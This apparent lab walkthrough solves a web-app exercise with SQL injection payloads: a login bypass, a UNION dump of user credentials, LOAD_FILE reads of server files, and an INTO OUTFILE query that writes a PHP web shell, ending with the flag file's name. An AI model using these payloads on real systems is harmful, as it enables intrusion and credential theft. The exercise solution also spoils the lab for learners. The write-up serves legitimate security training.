# Assessment

Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Bypass login

```
# username
asdf' or '1'='1' -- -
```

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

```
cn' UNION select 1, id, username, password, 5 from ilfreight.users-- -
```

<figure><img src="../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/dashboard/dashboard.php"), 3, 4, 5-- -
```

<figure><img src="../../.gitbook/assets/image (85) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption><p>root:password</p></figcaption></figure>

```
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -
```

<figure><img src="../../.gitbook/assets/image (97) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

flag\_cae1dadcd174.txt

```
cn' UNION SELECT 1, LOAD_FILE("/flag_cae1dadcd174.txt"), 3, 4, 5-- -
```

<figure><img src="../../.gitbook/assets/image (98) (1) (1).png" alt=""><figcaption></figcaption></figure>



